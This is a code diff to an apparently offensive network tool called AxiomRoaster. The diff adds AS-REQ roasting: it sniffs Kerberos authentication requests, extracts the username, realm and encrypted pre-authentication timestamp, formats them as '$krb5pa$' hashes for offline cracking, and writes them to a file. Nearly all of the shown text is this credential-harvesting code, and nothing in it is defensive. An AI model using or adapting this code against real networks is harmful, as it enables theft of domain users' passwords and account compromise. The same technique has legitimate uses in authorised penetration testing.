@@ -10,6 +10,7 @@ from AxiomRoaster.objects.Layout import AppLayout
 
 class Sniffer():
     _ROASTED_SPN = []
+    _ROASTED_USER = []
 
     @staticmethod
     def Start():
@@ -24,6 +25,10 @@ class Sniffer():
     @staticmethod
     def ProcessPacket(packet):
         args = AxiomArgParser.GetProgramArgs()
+        etype = 0
+        user = ""
+        realm = ""
+        enc_timestamp = ""
 
         if KRB_AS_REQ in packet:
             AppLayout.Log(type='INFO', content='Received AS_REQ packet')
@@ -32,9 +37,22 @@ class Sniffer():
             for _padata in packet[KRB_AS_REQ].padata:
                 if (_padata.padataType == ASN1_INTEGER(2)):
                     valid = True
+                    etype = _padata.padataValue.etype.val
+                    user = bytes(packet[KRB_AS_REQ].reqBody.cname.nameString[0])[2:].decode('latin-1')
+                    realm = bytes(packet[KRB_AS_REQ].reqBody.realm)[2:].decode('latin-1')
+                    enc_timestamp = bytes(_padata.padataValue.cipher)[2:].hex()
 
             if valid and len(packet[KRB_AS_REQ].reqBody.sname.nameString) == 2:
-                AppLayout.Log(type='INFO', content='AS_REQ contains an authenticator, continuing')
+                AppLayout.Log(type='INFO', content=f'AS_REQ contains an authenticator (etype {etype}), continuing')
+
+                if etype == 18 and user not in Sniffer._ROASTED_USER:
+                    asreq_ticket_str = f"$krb5pa${etype}${user}${realm}${enc_timestamp}"
+                    f = open("asreq.out", "a+")
+                    f.write(f"{asreq_ticket_str}\n")
+                    f.close()
+                    Sniffer._ROASTED_USER.append(user)
+                    AppLayout.Log(type='SUCCESS', content=f'ASREQ-roasted user {user}')
+                    AppLayout.AddTicket(type='ASREQ', principal=user, ticket_str=asreq_ticket_str)
 
                 e = KRB_AS_REQ()
                 e.pvno = ASN1_INTEGER(5)
